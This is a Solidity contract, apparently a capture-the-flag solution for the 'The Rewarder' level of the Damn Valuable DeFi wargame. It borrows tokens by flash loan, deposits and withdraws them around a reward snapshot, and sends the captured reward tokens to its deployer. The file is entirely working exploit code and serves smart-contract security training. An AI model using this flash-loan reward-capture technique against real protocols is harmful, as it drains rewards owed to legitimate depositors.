// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;
import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";

contract Attacker {
    FlashLoanerPool public immutable flashLoanPool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewardPool;
    RewardToken public immutable rewardToken;
    address public ownerAttacker;

    constructor(
        address poolAddress_,
        address liquidityTokenAddress_,
        address theRewarderPoolAddress_,
        address rewardTokenAddress_
    ) {
        flashLoanPool = FlashLoanerPool(poolAddress_);
        liquidityToken = DamnValuableToken(liquidityTokenAddress_);
        rewardPool = TheRewarderPool(theRewarderPoolAddress_);
        rewardToken = RewardToken(rewardTokenAddress_);
        ownerAttacker = msg.sender;
    }

    function executeAttack(uint256 amount_) public {
        flashLoanPool.flashLoan(amount_);
    }

    function receiveFlashLoan(uint256 amount_) public payable {
        require(
            msg.sender == address(flashLoanPool),
            "This function can only be called by pool"
        );
        liquidityToken.approve(address(rewardPool), amount_);
        rewardPool.deposit(amount_);

        rewardPool.withdraw(amount_);
        liquidityToken.transfer(msg.sender, amount_);
        
        uint256 rewardTokenAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(ownerAttacker, rewardTokenAmount);
    }
}
